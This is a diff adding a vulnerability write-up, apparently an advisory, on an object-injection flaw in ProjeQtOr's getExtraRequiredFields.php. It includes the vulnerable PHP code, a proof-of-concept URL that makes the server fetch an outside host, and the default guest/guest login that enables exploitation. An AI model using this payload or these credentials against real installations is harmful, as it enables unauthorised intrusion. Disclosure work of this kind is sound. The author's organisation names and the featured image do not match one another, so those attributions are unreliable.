@@ -1,0 +1,93 @@
+---
+type: article
+title: Direct Object Injection Vulnerability
+tags: [ProjeQtOr]
+date: 2023-03-19
+author: Eno Leriand
+featuredImage: https://escape.tech/blog/content/images/size/w2000/format/webp/2023/09/what-are-idor-graphql.png
+---
+
+# Zero-Day Vulnerability Discovery in ProjeQtOr
+
+As part of our Continuous Automated Red Teaming and Attack Surface Management capabilities within the **tea party**, we conduct zero-day vulnerability research on technologies commonly seen across the attack surfaces of organizations using this platform. This approach enables proactive defense, giving clients forward visibility into vulnerabilities while we coordinate with vendors to release appropriate fixes.
+
+## Vulnerability Overview: ProjeQtOr
+
+Today, we will discuss a vulnerability identified in **ProjeQtOr**.
+
+> "ProjeQtOr is an open-source project management software grouping in a single tool all the features needed to organize your projects. It is simple, easy to use while covering a maximum of project management features."
+
+The PartyLabs team discovered an authenticated *Direct Object Injection* vulnerability in ProjeQtOr while auditing anomalous technology across our client base. This vulnerability affects ProjeQtOr version 10.2.2 and earlier.
+
+To briefly recap, a *Direct Object Injection* vulnerability occurs when unvalidated user input is utilized to construct objects directly within application code.
+
+In the PHP context, this type of vulnerability is critical because it enables attackers to execute arbitrary PHP code within the context of the affected application. In practical terms, this vulnerability could permit an attacker to gain full control over the affected host and the sensitive data it holds.
+
+Fortunately, the ProjeQtOr team has issued a patch addressing this vulnerability on March 9th, 2023. While this update addresses a serious security issue, the vendor has not designated it as a security-specific release.
+
+## Technical Analysis of the Vulnerability
+
+Although *Direct Object Injection* vulnerabilities are somewhat uncommon, they are relatively straightforward to comprehend. Moreover, these vulnerabilities are often trivial to remediate.
+
+The vulnerability in question is present within the file `tool/getExtraRequiredFields.php`, allowing a malicious user to execute arbitrary PHP code through a crafted HTTP request, exploiting unvalidated input and causing a direct object injection.
+
+Below is the relevant code in `getExtraRequiredFields.php` that we identified as vulnerable:
+
+```php
+require_once "../tool/projeqtor.php";
+
+$objectClass=null;
+if (isset($_REQUEST['objectClassName'])) {
+  $objectClass=$_REQUEST['objectClassName'];
+}
+$objectId=null;
+if (isset($_REQUEST['id'])) {
+  $objectId=$_REQUEST['id'];
+} else if (isset($_REQUEST['id_detail'])) {
+  $objectId=$_REQUEST['id_detail'];
+}
+if ($objectClass===null or $objectId===null) {
+  throwError('className and/or id not found in REQUEST ('.$objectClass.'/'.$objectId.')');
+}
+
+$obj=new $objectClass($objectId);
+```
+
+### Code Breakdown
+
+Let’s walk through the core logic here:
+
+1. **Setting `objectClass`**: The code first checks if the HTTP request includes the `objectClassName` parameter. If found, the parameter’s value is assigned to the `$objectClass` variable.
+
+2. **Checking `id` or `id_detail` Parameters**: Next, it checks for two separate parameters in the HTTP request, `id` and `id_detail`. If either parameter is set, its value is assigned to the `$objectId` variable.
+
+3. **Validation of `objectClass` and `objectId`**: The code then verifies that both `$objectClass` and `$objectId` have been populated. If either is null, it triggers an error message via the `throwError` function.
+
+4. **Object Instantiation**: Finally, the code creates a new object of the class defined by `$objectClass`, passing `$objectId` as a parameter.
+
+Because `$objectClass` and `$objectId` are sourced directly from user input without validation, an attacker can construct an HTTP request that assigns arbitrary values to these parameters, effectively instantiating arbitrary classes with controlled arguments.
+
+### Proof of Concept (PoC)
+
+The following URL provides a PoC that demonstrates exploitability of this vulnerability:
+
+```plaintext
+https://hostname/tool/getExtraRequiredFields.php?objectClassName=SplFileObject&id_detail=http://SplFileObject.watchtowr.com
+```
+
+In this PoC, we use PHP’s built-in `SplFileObject` class, which supports instantiation with local or remote URLs. By invoking this class, we can confirm the vulnerability and demonstrate the feasibility of exploitation by interacting with an externally controlled host.
+
+It’s important to note that, while this vulnerability cannot be exploited by an unauthenticated user, ProjeQtOr includes a default “guest” account with `guest/guest` credentials, which enables exploitation of this vulnerability.
+
+## Conclusion
+
+This article has provided an insight into a typical vulnerability we encounter in our client audits. In this case, our audit identified a single vulnerability reported to the vendor, and a CVE is currently pending.
+
+While this vulnerability is relatively easy to spot, it has a high impact considering the sensitive data ProjeQtOr manages, and, of course, the ease of code execution on a publicly exposed system should not be underestimated.
+
+However, the ProjeQtOr team’s swift response in remediating the issue is commendable.
+
+At watchTowr, we are firm believers in continuous security testing as the future of cybersecurity, allowing for the rapid identification of high-impact vulnerabilities that can affect an organization holistically.
+
+If you would like to learn more about the watchTowr Platform, our Continuous Automated Red Teaming, and Attack Surface Management solutions, please don’t hesitate to reach out.
+
